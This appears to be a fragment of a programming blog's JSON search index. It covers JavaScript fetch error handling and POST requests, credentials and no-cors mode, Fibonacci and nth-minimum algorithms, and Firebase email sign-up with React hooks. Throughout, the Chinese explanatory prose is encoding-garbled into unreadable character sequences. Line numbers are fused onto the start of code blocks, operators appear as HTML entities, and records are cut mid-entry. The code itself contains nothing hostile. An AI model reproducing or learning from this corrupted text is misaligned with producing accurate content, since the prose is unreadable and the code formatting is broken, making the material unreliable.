é€™å€‹ç¯„ä¾‹æ˜¯å»æ‰“ä¸€å€‹æœƒæ‹¿åˆ° status: 400 çš„ APIï¼Œä¸¦ä¸”æœƒå›å‚³åº•ä¸‹è¨Šæ¯ï¼š 123{ \"errorMessage\": \"parameter invalid\"} æ¥ä¸‹ä¾†è¦å•ä½ ä¸€å€‹å•é¡Œï¼š æ—¢ç„¶æœƒæ‹¿åˆ° 400ï¼Œé‚£æœ€å¾ŒæœƒåŸ·è¡Œçš„æ‡‰è©²æ˜¯ catch((error) =&gt; console.log('error', error)) é€™æ®µå°å§ï¼Ÿ å…ˆè‡ªå·±æƒ³æƒ³çœ‹ï¼Œæƒ³å¥½å¾Œå†å¾€ä¸‹æ»‘ã€‚ â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“â€“ é˜²é›·ç·š â€“ ç­”æ¡ˆæ˜¯ï¼šä¸æœƒï¼Œä¸€æ¨£æœƒåŸ·è¡Œ .then() çš„éƒ¨åˆ†ã€‚ é€™æ˜¯ fetch æ¯”è¼ƒç‰¹åˆ¥çš„åœ°æ–¹ï¼Œå°±æ˜¯å°å®ƒè€Œè¨€ï¼š é™¤éæ˜¯é‡åˆ°ç¶²è·¯éŒ¯èª¤ï¼ˆserver æ²’è¾¦æ³•å›å‚³ responseï¼‰ï¼Œå¦å‰‡é€™å€‹ Promise ä¸€å¾‹æœƒè¢« resolve é™¤éæ˜¯é‡åˆ°ç¶²è·¯éŒ¯èª¤ï¼ˆserver æ²’è¾¦æ³•å›å‚³ responseï¼‰ï¼Œå¦å‰‡é€™å€‹ Promise ä¸€å¾‹æœƒè¢« resolve é™¤éæ˜¯é‡åˆ°ç¶²è·¯éŒ¯èª¤ï¼ˆserver æ²’è¾¦æ³•å›å‚³ responseï¼‰ï¼Œå¦å‰‡é€™å€‹ Promise ä¸€å¾‹æœƒè¢« resolve ä¹Ÿå°±æ˜¯èªªä¸ç®¡æ˜¯ 400ã€401 æˆ–ç”šè‡³æ˜¯ 500ï¼Œé€™å€‹ Promise æœ€å¾Œéƒ½é‚„æ˜¯æœƒ resolveï¼Œæ‰€ä»¥æœƒè¢«åŸ·è¡Œçš„ä¾ç„¶æ˜¯ .then è€Œä¸æ˜¯ .catchã€‚ æ­£ç¢ºçš„è™•ç†æ–¹å¼æ‰€ä»¥æ‹¿å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œå¦‚æœæˆ‘å¸Œæœ›å° status ä¸æ˜¯ 200 çš„æ™‚å€™åšéŒ¯èª¤è™•ç†çš„è©±ï¼Œè¦åœ¨ .then è£¡é¢åšåˆ¤æ–·ï¼š 123456789101112131415function example2() { fetch(url400) .then(async (response) =&gt; { // ok = false ä»£è¡¨ status ä¸åœ¨ 200 ~ 299 ä¹‹é–“ // reference: https://developer.mozilla.org/en-US/docs/Web/API/Response/ok if (!response.ok) { // å¼·åˆ¶å›å‚³ä¸€å€‹ reject çš„ promise return Promise.reject(await response.json()) } // é †åˆ©çš„è©±ç›´æ¥ç”¨ json è§£æä¸¦å›å‚³ return response.json() }) .then((data) =&gt; console.log('success', data)) .catch((error) =&gt; console.log('error', error))} é€™æ¨£å­å°±å¯ä»¥æ­£ç¢ºçš„é€²å…¥ .catch ä¸¦æ‹¿åˆ°éŒ¯èª¤è¨Šæ¯äº†ï¼š","link":"/2022/03/03/fetch-handle-error/"},{"title":"fetch ç™¼ post çš„æ–¹å¼","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°åªæ˜¯ä»‹ç´¹ä¸€ä¸‹è©²æ€éº¼å¯«åƒæ•¸ï¼š å‚³é€ JSON æ ¼å¼ 123456789101112fetch(url, { // HTTP method method: 'POST', // è³‡æ–™ body: JSON.stringify(json), headers: { // è³‡æ–™å‚³ä»€éº¼é€™é‚Šå°±å¯«ä»€éº¼ 'Content-type': 'application/json; charset=UTF-8', }}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) å‚³é€ Form è¡¨å–®ï¼ˆformDataï¼‰ é€™å€‹å°±è·Ÿ XHR ä¸€æ¨£ï¼Œä¸è¦å†è¨­å®š Content-type äº†ï¼Œä¸ç„¶æ ¼å¼æœƒè·‘æ‰ã€‚ 1234567891011const formData = new FormData();formData.append('name', 'PeaNu');formData.append('age', '22');formData.append('gender', 'man');fetch(url, { method: 'POST', body: formData,}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) å‚³é€ Form è¡¨å–®ï¼ˆä¸€èˆ¬çš„è¡¨å–®ï¼‰ 12345678910fetch(api200, { method: 'POST', body: 'name=peanu&amp;age=20&amp;gender=man', headers: { // è¨˜å¾—åŠ é€™è¡Œ 'Content-type': 'application/x-www-form-urlencoded' }}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err))","link":"/2022/03/03/fetch-post/"},{"title":"fetch çš„æ³¨æ„äº‹é …","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°Content-typeä½ å‚³ä»€éº¼è³‡æ–™å°±æ‡‰è©²å¯«ä»€éº¼æ ¼å¼ï¼š Json =&gt; application/json Form =&gt; application/x-www-form-urlencoded FormData =&gt; é›–ç„¶æ˜¯ multipart/form-data ä½†ä¸éœ€è¦å¯« Credentialç°¡å–®ä¾†èªªå°±æ˜¯ã€Œç™¼ request æ™‚è¦ä¸è¦å¸¶ä¸Š Cookieã€ï¼Œé è¨­æ˜¯ã€Œä¸æœƒã€ï¼Œå¦‚æœæƒ³è¦çš„è©±å¾—åŠ ä¸Šé€™æ®µè¨­å®šï¼š 12345678fetch(url, { // cros credentials: 'include' // åŒæºæ‰å¸¶ credentials: 'same-origin', // ä¿è­‰ä¸å¸¶ credentials: 'omit'}) Modeæœ€å¸¸è¢«äººèª¤è§£çš„æ±è¥¿ï¼Œæ‰€ä»¥ç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹ï¼š é€™ä¸æ˜¯ç”¨ä¾†ç ´é™¤ CROS çš„é™åˆ¶ é€™ä¸æ˜¯ç”¨ä¾†ç ´é™¤ CROS çš„é™åˆ¶ é€™ä¸æ˜¯ç”¨ä¾†ç ´é™¤ CROS çš„é™åˆ¶ ä»–çš„ç›®çš„æ˜¯å‘Šè¨´ç€è¦½å™¨ï¼š å°ï¼Œæˆ‘çŸ¥é“ server æ²’æœ‰é–‹ CROSï¼Œä½†æˆ‘æœ¬ä¾†å°±æ²’æœ‰æƒ³æ‹¿åˆ° responseï¼Œæ‰€ä»¥ä½ ä¸è¦è®“ç¨‹å¼è·‘åˆ° catch é‚£é‚Šã€‚ æ‰€ä»¥èªªå¦‚æœé€™æ¨£è¨­å®šï¼š 12345678910fetch(lidemy, { method: 'POST', body: 'name=peanu&amp;age=20&amp;gender=man', headers: { 'Content-type': 'application/x-www-form-urlencoded' }, mode: \"no-cors\"}).then(res =&gt; console.log(res)).catch(err =&gt; console.log(err)) å°±æœƒæˆåŠŸæ‹¿åˆ° responseï¼Œä¸éæ˜¯ã€Œé€æ˜çš„ã€ï¼š 12345678Response { type: 'opaque', url: '', redirected: false, status: 0, ok: false, // ...}","link":"/2022/03/03/fetch-tips/"},{"title":"è²»å¼æ•¸åˆ—","text":"å¥½åƒå¯«ç¨‹å¼éƒ½ä¸€å®šæœƒå¯¦ä½œçš„æ•¸åˆ—ã€‚ éè¿´æ³•éè¿´çš„æ„æ€å°±æ˜¯ åœ¨ä¸€å€‹ function è£¡é¢å‘¼å«è‡ªå·±ï¼Œè€Œè²»å¼æ•¸åˆ—çš„è¦å¾‹æ­£å¥½æ˜¯é€™ç¨®ç‰¹æ€§ï¼š 123456789101112fib(0) = 0fib(1) = 1fib(2) = fib(0) + fib(1) = 1fib(3) = fib(1) + fib(2) = 2fib(4) = fib(2) + fib(3) = 3fib(5) = fib(3) + fib(4) = 5fib(6) = fib(4) + fib(5) = 8fib(7) = fib(5) + fib(6) = 13fib(8) = fib(6) + fib(7) = 21fib(9) = fib(7) + fib(8) = 34fib(10) = fib(8) + fib(9) = 55... æ‰€ä»¥é™¤äº† fib(0) è·Ÿ fib(1) ä¹‹å¤–ï¼Œå¦‚æœæƒ³å–å‡ºæ•¸åˆ—ä¸­çš„ç¬¬ n å€‹å€¼ï¼Œå°±å¯ä»¥ç”¨ fib(n) = fib(n-2) + fib(n-1) çš„æ–¹å¼ä¾†å–å¾—ï¼Œæ‰€ä»¥ç”¨éè¿´çš„æ–¹å¼ä¾†å¯«çš„è©±å°±æœƒé€™æ¨£ï¼š 123456function fib(n) { if(n === 0) return 0 if(n === 1) return 1 return fib(n-2) + fib(n-1)}fib(10) // 55 ç”¨é€™ç¨®æ–¹å¼å¯¦ä½œçš„æ™‚é–“è¤‡é›œåº¦å¤§ç´„æœƒæ˜¯ ã€ŒO(2^n)ï¼ˆå¯¦éš›ä¸Šæ˜¯ O(1.6^n) å·¦å³ï¼‰ã€ ã€‚ æ„æ€æ˜¯æŒ‡æ¯ç•¶ n å¢åŠ  1ï¼ŒåŸ·è¡Œçš„æ­¥é©Ÿå°±æœƒå¢åŠ  2 å€ï¼š 1234n = 1 =&gt; 2n = 2 =&gt; 4n = 3 =&gt; 8... ä¹Ÿå°±æ˜¯èªªå¦‚æœè¦æ±‚å‡º f(100) çš„å€¼ï¼Œå¤§æ¦‚å°±æœƒéœ€è¦ 2^100 æ¬¡æ­¥é©Ÿã€‚å¦‚æœä½ æŠŠæ‹¿ä¸Šé¢çš„ç¨‹å¼ç¢¼å»è·‘è·‘çœ‹ï¼Œå¤§æ¦‚æœƒç›´æ¥ç•¶æ©Ÿ ( ÂºÏ‰Âº ) æƒ³çŸ¥é“è©³ç´°çš„æ­¥é©Ÿå¯ä»¥åƒè€ƒ é€™ç¯‡æ–‡ç« ã€‚ æ‰€ä»¥å¾ä¸Šé¢ä½ å¯ä»¥çŸ¥é“ï¼Œç”¨éè¿´ä¾†æ±‚è²»å¼æ•¸åˆ—ä¸¦ä¸æ˜¯ä¸€å€‹å¥½åšæ³•ã€‚ ä»¥ç©ºé–“æ›å–æ™‚é–“éè¿´æ³•æœ€å¤§çš„å•é¡Œåœ¨æ–¼ã€Œé‡è¤‡è¨ˆç®—ã€ï¼Œä¾‹å¦‚èªªåœ¨æ±‚ fib(5) çš„æ™‚å€™æ˜¯åƒé€™æ¨£å­ï¼š fib(0) ç¸½å…±è¢«å‘¼å«äº† 3 æ¬¡ fib(1) ç¸½å…±è¢«å‘¼å«äº† 5 æ¬¡ fib(2) ç¸½å…±è¢«å‘¼å«äº† 3 æ¬¡ fib(3) ç¸½å…±è¢«å‘¼å«äº† 2 æ¬¡ èˆ‡å…¶é€™æ¨£æ¯æ¬¡éƒ½é‡è¤‡å‘¼å«ï¼Œä¸å¦‚ã€ŒæŠŠæ¯å€‹å€¼éƒ½å¯«åœ¨ä¸€å¼µè¡¨ä¸Šã€ï¼Œç­‰éœ€è¦çŸ¥é“å€¼çš„æ™‚å€™å†å»æŸ¥è¡¨å°±å¥½äº†ã€‚ æ‰€ä»¥å¯ä»¥å»ºç«‹ä¸€å€‹ array ä¾†å„²å­˜æ•¸åˆ—ä¸­çš„æ¯å€‹å€¼ã€‚ç•¶æƒ³è¦æœå°‹æ•¸åˆ—è£¡ç¬¬ n å€‹å€¼çš„æ™‚å€™ï¼Œå°±å…ˆæŠŠ 0 ~ n çš„é€™å€‹æ•¸åˆ—è¡¨å»ºç«‹å‡ºä¾†ï¼Œæ¥è‘—åœ¨ç›´æ¥æŸ¥è¡¨å°±å¯ä»¥äº†ï¼š 1234567891011121314151617function fib(n) { // å„²å­˜æ•¸åˆ—çš„é™£åˆ— // ä¸€é–‹å§‹å…ˆå¡«å…¥ 0 è·Ÿ 1 é€™å…©å€‹åˆå§‹å€¼ let sequence = [0, 1] // ç•¶ n &gt; 1 çš„æ™‚å€™å°±å»æ›´æ–°é™£åˆ—ä¸­çš„æ•¸åˆ— for(let i=2; i&lt;=n; i++) { // i=2ï¼Œå»å¾é™£åˆ—ä¸­æ‰¾å‡º sequence[0] è·Ÿ sequence[1] çš„å€¼åšç›¸åŠ ï¼Œ // æ¥è‘—æŠŠè¨ˆç®—å¾Œçš„å€¼å„²å­˜åˆ° sequence[2] è£¡é¢ // i=3ï¼Œå»å¾é™£åˆ—ä¸­æ‰¾å‡º sequence[2] è·Ÿ sequence[1] çš„å€¼åšç›¸åŠ ï¼Œ // æ¥è‘—æŠŠè¨ˆç®—å¾Œçš„å€¼å„²å­˜åˆ° sequence[3] è£¡é¢ // ... sequence[i] = sequence[i-2] + sequence[i-1] } // å»é™£åˆ—è£¡é¢æŸ¥ç¬¬ n å€‹æ•¸åˆ—çš„å€¼ return sequence[n]}fib(10) ç”¨é€™ç¨®æ–¹å¼åšå‡ºä¾†çš„æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯ O(n)ï¼Œæ„æ€æ˜¯ n çš„å€¼å°±æ˜¯æ­¥é©Ÿçš„æ¬¡æ•¸ã€‚ æ‰€ä»¥ç¾åœ¨å¦‚æœè¦æ±‚ fib(100) ä¹Ÿåªéœ€è¦ 100 æ¬¡æ­¥é©Ÿï¼Œä¿è­‰ä½ çš„é›»è…¦ä¸æœƒå†ç•¶æ©Ÿæƒ¹ã€‚","link":"/2021/12/30/fibonacci-sequence/"},{"title":"æ‰¾å‡ºç¬¬ n å€‹æœ€å°å€¼","text":"ä¾†è‡ª JS101 çš„ç·´ç¿’é¡Œï¼Œè¦ºå¾—é‚è¼¯é‚„è »ç¥å¥‡çš„ï¼Œæ‰€ä»¥æƒ³è¨˜ä¸‹ä¾†ã€‚ æŠŠæ¯ä¸€æ¬¡éƒ½ç•¶ä½œç¬¬ä¸€æ¬¡å…¶å¯¦ä¸€èˆ¬ç›´è¦ºæœƒæƒ³åˆ°çš„æ–¹æ³•æ‡‰è©²æ˜¯ï¼š æŠŠæ•¸åˆ—æ’åº =&gt; ç”±å°åˆ°å¤§ ç”¨ n å»å¾å·²ç¶“æ’åºå¥½çš„æ•¸åˆ—è£¡æŸ¥å€¼ æ‰€ä»¥ç”¨ä½œå¼Šä¸€é»çš„æ–¹æ³•çš„è©±æœƒæ˜¯é€™æ¨£å­ï¼š 123456789function findNthMin(arr, n) { // é‡æ–°æ’åº =&gt; ç”±å°åˆ°å¤§ const sortedArray = arr.sort((a, b) =&gt; a-b) // array å¾ 0 é–‹å§‹ï¼Œæ‰€ä»¥æ‰è¦ -1 return sortedArray[n-1]}console.log(findNthMin([1, 2, 3, 4, 5], 2)) // 2console.log(findNthMin([1, 3, 5, 7, 9], 3)) // 5console.log(findNthMin([1, 1, 1, 1, 1], 2)) // 1 ä½†é€™ä¸æ˜¯é€™ç¯‡æ–‡ç« æƒ³ä»‹ç´¹çš„ï¼Œæƒ³ä»‹ç´¹çš„æ˜¯å¦å¤–ä¸€ç¨®æ€ç¶­ï¼š å¾æ•¸åˆ—ä¸­æ‰¾å‡ºæœ€å°å€¼ æŠŠæœ€å°å€¼å¾æ•¸åˆ—ä¸­åˆªé™¤ é‡è¤‡æ­¥é©Ÿ 1ã€2ï¼Œç›´åˆ°é‡è¤‡ n æ¬¡ç‚ºæ­¢ æ‰€ä»¥å…¶å¯¦æ¯ä¸€æ¬¡éƒ½åªæ˜¯åœ¨æ‰¾æœ€å°å€¼ï¼Œä½†é‡é»åœ¨æ–¼ æ¯ä¸€æ¬¡éƒ½æœƒæŠŠæœ€å°å€¼ç§»é™¤ é€™å€‹å‹•ä½œï¼Œé€™å€‹å‹•ä½œæœƒè®“ä½ ä¸‹ä¸€æ¬¡æ‰¾åˆ°çš„å…¶å¯¦æ˜¯ æ¬¡å°å€¼ï¼Œæ¥è‘—æ˜¯ æ¬¡æ¬¡å°å€¼ï¼Œä»¥æ­¤é¡æ¨ã€‚ æ‰€ä»¥ç•¶ä½ åšäº† n æ¬¡å¾Œï¼Œé‚£ä¸€æ¬¡çš„æœ€å°å€¼å°±ç­‰åŒæ–¼ç¬¬ n å€‹æœ€å°å€¼äº†ï¼ŒæŒºç¥å¥‡çš„å§ï¼Ÿé¦¬ä¸Šä¾†å¯¦ä½œçœ‹çœ‹ï¼š 123456789101112131415161718192021222324252627function findNthMin(arr, n) { // å„²å­˜ç¬¬ n å€‹æœ€å°å€¼ let min = null // é‡è¤‡æ‰¾æœ€å°å€¼ n æ¬¡ for(let i=0; i&lt;n; i++) { // æ¯ä¸€æ¬¡éƒ½é‡æ–°è¨­å€¼ç‚ºç„¡ç·šå¤§ min = Infinity // å„²å­˜æœ€å°å€¼çš„ä½ç½® let k = null // éæ­·é™£åˆ—ï¼Œæ‰¾å‡ºæœ€å°å€¼ for(let j=0; j&lt;arr.length; j++) { if(arr[j] &lt; min) { // æ›´æ–°æœ€å°å€¼ min = arr[j] // æ›´æ–°æœ€å°å€¼çš„ä½ç½® k = j } } // åˆªé™¤æœ€å°å€¼ arr.splice(k, 1) } // å›å‚³çµæœ return min}console.log(findNthMin([1, 2, 3, 4, 5], 2)) // 2console.log(findNthMin([1, 3, 5, 7, 9], 3)) // 5console.log(findNthMin([1, 1, 1, 1, 1], 2)) // 1 é›–ç„¶é€™è§£æ³•æ¯”è¼ƒè¤‡é›œä¸€é»ï¼Œä½†æ˜¯é‚„è »æœ‰è¶£çš„ï¼ ç”¨åœ¨æ’åºä¸Šé€™å€‹æ–¹æ³•å…¶å¯¦ä¹Ÿèƒ½ç”¨ä¾†åšæ’åºï¼Œåƒè€ƒä¸‹é¢çš„åŸå§‹ç¢¼ï¼š 123456789101112131415161718192021222324252627282930313233343536function sort(arr) { // å„²å­˜æœ€å°å€¼ let min = null // å„²å­˜æ’åºå¥½çš„çµæœ const result = [] // è¨˜å¾—å„²å­˜é™£åˆ—é•·åº¦ï¼ˆå› ç‚ºæ›´æ–°é™£åˆ—æ™‚ length å€¼æœƒæ”¹è®Šï¼‰ // i=0 =&gt; arr.length=5 // i=1 =&gt; arr.length=4 // i=2 =&gt; arr.length=3 // i=3 =&gt; arr.length=2 // è¿´åœˆå°±çµæŸäº†ï¼Œç¸½å…±åªè·‘ 3 åœˆï¼Œæ‰€ä»¥åªæœƒå¾—åˆ° [1, 2, 3] const total = arr.length // é‡æ–°æ’åº for(let i=0; i&lt;total; i++) { // æ¯ä¸€æ¬¡éƒ½é‡ç½®ç‚ºç„¡é™å¤§ min = Infinity // å„²å­˜æœ€å°å€¼çš„ä½ç½® let k = null // éæ­·é™£åˆ—ï¼Œæ‰¾å‡ºæœ€å°å€¼ for(let j=0; j&lt;arr.length; j++) { if(arr[j] &lt; min) { // æ›´æ–°æœ€å°å€¼ min = arr[j] // æ›´æ–°æœ€å°å€¼çš„ä½ç½® k = j } } // æŠŠæœ€å°å€¼æ”¾åˆ°çµæœé™£åˆ—è£¡ result[i] = min // ç§»é™¤æœ€å°å€¼ arr.splice(k, 1) } // å›å‚³ç¬¬ n å€‹æœ€å°å€¼ return result}console.log(sort([1, 2, 3, 4, 5])) å°±è·ŸåŸæœ¬çš„åšæ³•å·®ä¸å¤šï¼Œä½†è¦ç‰¹åˆ¥æ³¨æ„ length å€¼æœƒæ”¹è®Šé€™ä»¶äº‹æƒ…ï¼Œä¸è¦åƒæˆ‘ä¸€æ¨£å¿½ç•¥äº†ã€‚","link":"/2021/12/30/find-nth-min/"},{"title":"æ‰¾å‡ºæ¬¡å¤§å€¼","text":"åŸä¾†æ˜¯é€™æ¨£å­æ“ä½œï¼ ç¨‹å¼ç¢¼123456789101112let arr = [5, 8, 6]let max = -Infinitylet max2 = -Infinityfor(let i=0; i&lt;arr.length; i++) { if (arr[i] &gt; max) { max2 = max max = arr[i] } else if (arr[i] &gt; max2) { max2 = arr[i] }}console.log(max, max2) é‚„è¨˜å¾—æ›¾ç¶“çš„äººé«”ç·¨è­¯å™¨å—ï¼š 1234567891011121314151617181920211. è¨­ arr ç‚º [5, 8, 6]2. è¨­ max ç‚º -Infinity3. è¨­ max2 ç‚º -Infinity4. é€²å…¥è¿´åœˆï¼Œi å¾ 0 è·‘åˆ° 25. i ç¾åœ¨æ˜¯ 06. åˆ¤æ–· arr[0] &gt; max =&gt; (5 &gt; -Infinity) =&gt; æ˜¯7. æŠŠ max2 è¨­ç‚º max =&gt; max2 = -Infinity8. æŠŠ max è¨­ç‚º arr[0] =&gt; max = 59. ä¸‹ä¸€åœˆè¿´åœˆ10. i ç¾åœ¨æ˜¯ 111. åˆ¤æ–· arr[1] &gt; max =&gt; (8 &gt; 5) =&gt; æ˜¯12. æŠŠ max2 è¨­ç‚º max =&gt; max2 = 513. æŠŠ max è¨­ç‚º arr[1] =&gt; max = 814. ä¸‹ä¸€åœˆè¿´åœˆ15. i ç¾åœ¨æ˜¯ 216. åˆ¤æ–· arr[2] &gt; max =&gt; (6 &gt; 8) =&gt; ä¸æ˜¯17. åˆ¤æ–· arr[2] &gt; max2 =&gt; (6 &gt; 5) =&gt; æ˜¯11. æŠŠ max2 è¨­ç‚º arr[2] =&gt; max2 = 618. ä¸‹ä¸€åœˆè¿´åœˆ19. i ç¾åœ¨æ˜¯ 3ï¼Œä¸ç¬¦åˆæ¢ä»¶ï¼ŒçµæŸè¿´åœˆ20. å°å‡º max, max2 =&gt; 8, 6 è§£èªªå…¶å¯¦é€™ä¸€é¡Œçš„çœ‰è§’åœ¨æ–¼ã€Œå¤šç”¨äº†ä¸€å€‹è®Šæ•¸ä¾†å„²å­˜æ¬¡å¤§å€¼ã€ã€‚ æ¯ç•¶ max ç¢°åˆ°æ¯”è‡ªå·±å¤§çš„æ•¸å­—æ™‚ï¼Œmax2 æœƒå…ˆæŠŠ max çš„å€¼çµ¦å„²å­˜èµ·ä¾†ï¼Œæ¥è‘—æ‰æŠŠ max çš„å€¼çµ¦æ›´æ–°ã€‚ ä¸éè¦ç‰¹åˆ¥æ³¨æ„çš„ä¸€å€‹æƒ…æ³æ˜¯ï¼šã€Œarr[i] æ²’æœ‰æ¯” max å¤§ï¼Œä½†å»æ¯” max2 å¤§ã€çš„æƒ…æ³ï¼Œæ‰€ä»¥é€™å€‹éƒ¨åˆ†ä¹Ÿè¦å†å¤šåšä¸€å±¤åˆ¤æ–·ï¼Œæ‰ä¸æœƒæ¼æ‰é€™å€‹å¯èƒ½æ€§ã€‚","link":"/2021/12/21/find-second-max/"},{"title":"Firebaseï¼Authentication","text":"å¾ˆå¼·å¤§çš„åŠŸèƒ½ã€‚ ç°¡è¿°åœ¨ Firebase åŸºç¤ ä¸­å·²ç¶“ä»‹ç´¹éæ€éº¼ä½¿ç”¨ Firebase çš„ firestore æœå‹™ï¼Œé€™ç¯‡è¦ä¾†ä»‹ç´¹ Authenticationï¼Œä¹Ÿå°±æ˜¯è·Ÿç™»å…¥ç›¸é—œçš„åŠŸèƒ½ã€‚ é™„è¨»ï¼šé€™é‚Šä¸€æ¨£æœƒç”¨ firebase@8.2 ä¾†èˆ‰ä¾‹ï¼Œæ‰€ä»¥è¨˜å¾—è£å°ç‰ˆæœ¬ã€‚ é¡Œå¤–è©±å¯«å®Œé€™ç¯‡å¾Œæˆ‘æ‰é«”æœƒä»€éº¼å«åš SDKï¼Ÿå…¶å¯¦é€™ç¯‡ç”¨åˆ°çš„ç™»å…¥ç™»å‡º method éƒ½æ˜¯å…ˆç¶“é Firebase åŒ…è£æˆ SDK å¾Œï¼Œæˆ‘å€‘æ‰å¯ä»¥ç”¨å¾ˆç°¡å–®çš„ä¸€å€‹ function ä¾†å®Œæˆçš„ã€‚ å¦‚æœæ²’æœ‰è¢«åŒ…è£æˆ SDK çš„è©±ï¼Œæˆ‘å€‘å¯èƒ½å°±è¦è‡ªå·±ç”¨ fetch æˆ–æ˜¯ XMLHttpRequest ä¹‹é¡çš„ä¾†è‡ªå·±è™•ç†ï¼Œä¸æœƒé€™éº¼è¼•é¬†ã€‚ æœƒå¯«é€™æ®µåªæ˜¯å› ç‚ºæˆ‘ä»¥å‰æœ‰åšä¸€å€‹ ç­†è¨˜ï¼Œç•¶æ™‚é‚„æ²’æœ‰å¾ˆèƒ½é«”æœƒ SDK è·Ÿ API åˆ°åº•å¯¦éš›å·®åœ¨å“ªï¼Œä½†ç¾åœ¨çªç„¶è¢«æ‰“é€šäº†ï¼Œæ„Ÿè¦ºé‚„è »ç¥å¥‡çš„ã€‚ å¾Œç«¯çš„éƒ¨åˆ†Firebase çš„å°ˆæ¡ˆå»ºå¥½å¾Œï¼Œå›åˆ°ä¸»æ§å°æœƒçœ‹åˆ°å´é‚Šæ¬„æœ‰ä¸€å€‹ã€ŒAuthenticationã€çš„é¸é …ï¼Œé»é€²å»å¾Œå†é¸å–ã€Œget startã€å°±æœƒçœ‹åˆ°é€™å€‹ç•«é¢ï¼š é€™é‚Šæ˜¯è®“ä½ é¸ä½ è¦å•Ÿç”¨å“ªç¨®ç™»å…¥æ–¹å¼ï¼Œé€™é‚Šæœƒç”¨ã€Œé›»å­éƒµä»¶ã€ä¾†åšèˆ‰ä¾‹ï¼Œæ‰€ä»¥å°±é»é¸å¾ŒæŠŠä»–å•Ÿç”¨ã€‚ å‰ç«¯çš„éƒ¨åˆ†å°±å’Œè¨­å®š firestore çš„æ–¹å¼å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº†ä¸€å€‹ auth çš„éƒ¨åˆ†è€Œå·²ï¼š 123456789101112131415161718192021import firebase from 'firebase/app'import 'firebase/firestore'import 'firebase/auth'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()export { db, auth } é—œæ–¼ Firebase çš„é©—è­‰åŸç†é€™é‚Šåªæ˜¯æƒ³åšå€‹è£œå……ï¼ŒFirebase çš„é©—è­‰æ©Ÿåˆ¶æ˜¯é€é JWT ä¾†å¯¦ä½œçš„ã€‚ç•¶ä½¿ç”¨è€…ç™»å…¥æˆåŠŸæ™‚ Firebase æœƒç”¢ç”Ÿä¸€å€‹ JWTï¼Œæ¥è‘—æˆ‘å€‘åªè¦åœ¨æ¥ä¸‹ä¾†çš„ request ä¸­éƒ½å¸¶ä¸Š JWT å°±å¯ä»¥é”åˆ°é©—è­‰æ©Ÿåˆ¶äº†ã€‚ å¦‚æœä½ å° JWT æœ‰é»å¥½å¥‡çš„è©±ï¼Œæ¨è–¦åƒè€ƒæˆ‘å¯«çš„é€™ç¯‡ï¼šé—œæ–¼ JWTï¼ˆJSON-Web-Tokenï¼‰ï¼Œè£¡é¢æœ‰è§£é‡‹ JWT æ˜¯æ€éº¼ç”¢ç”Ÿçš„ã€‚ è¨»å†ŠåŠŸèƒ½é€™é‚Šå…ˆä»‹ç´¹é€éã€Œemailã€ä¾†è¨»å†Šçš„æµç¨‹ï¼Œæœƒä»¥ custom hook çš„æ–¹å¼ä¾†æ’°å¯«ã€‚ å…ˆä¾†çœ‹æ®µ code å†è§£é‡‹ï¼š 12345678910111213141516171819202122232425import { useState } from 'react'import { auth } from 'firebase/config'export function useSignup() { const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) const signup = async (email, password, displayName) =&gt; { setIsPending(true) setError(null) try { const response = await auth.createUserWithEmailAndPassword(email, password) if (!response.user) throw new Error('Signup failed.') // update profile await response.user.updateProfile({ displayName }) setIsPending(false) } catch (error) { setError(error.message) setIsPending(false) } } return { error, isPending, signup }} ç°¡å–®ä¾†èªªæœ‰å…©å€‹æµç¨‹ï¼š ç”¨ createUserWithEmailAndPassword ä¾†å»ºç«‹åŸºæœ¬è³‡æ–™ ç”¨ updateProfile ä¾†æ›´æ–° displayName å› ç‚ºé€™å…©å€‹æ±è¥¿æ˜¯æ‹†æˆå…©å€‹ API ä¾†åšçš„ï¼Œæ‰€ä»¥æ‰è¦åˆ†å…©å€‹å‹•ä½œã€‚ ç¸½ä¹‹ï¼Œåœ¨æˆåŠŸå»ºç«‹ä»¥å¾Œä½ å¯ä»¥åˆ° Firebase çš„ä¸»æ§å°ä¾†ç¢ºèªï¼š å¦‚æœè¦åˆªé™¤ä¹Ÿæ˜¯å¾é€™é‚Šåˆªï¼ŒæŠŠå®ƒç•¶ä½œè³‡æ–™åº«å°±è¡Œäº†ã€‚ åŠ ä¸Šä½¿ç”¨è€…é ­åƒçš„åŠŸèƒ½é€™é‚Šåªæ˜¯ç•¶ä½œè£œå……çš„æ‡¶äººåŒ…ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import { useEffect, useState } from 'react'import { auth, storage } from 'firebase/config'import { useAuthContext } from './useAuthContext'export function useSignup() { const [isPending, setIsPending] = useState(false) const [isCancelled, setIsCancelled] = useState(false) const [error, setError] = useState(null) const { dispatch } = useAuthContext() const signup = async (email, password, displayName, thumbnail) =&gt; { setIsPending(true) setError(null) try { // create user const response = await auth.createUserWithEmailAndPassword(email, password) if (!response.user) throw new Error('Signup failed.') // upload thumbnail const uploadPath = `thumbnail/${response.user.uid}/${thumbnail.name}` const img = await storage.ref(uploadPath).put(thumbnail) const imgUrl = await img.ref.getDownloadURL() // update profile await response.user.updateProfile({ displayName, photoURL: imgUrl }) // update global state dispatch({ type: 'LOGIN', payload: response.user }) // update state if (!isCancelled) { setIsPending(false) } } catch (error) { if (!isCancelled) { setError(error.message) setIsPending(false) } } } useEffect(() =&gt; { return () =&gt; setIsCancelled(true) }, []) return { error, isPending, signup }} ç°¡å–®ä¾†èªªå°±æ˜¯ï¼š è¨­å®šè¦ä¸Šå‚³çš„è·¯å¾‘ï¼š/thumbnail/${ä½¿ç”¨è€…uid}/${æª”æ¡ˆåç¨±} 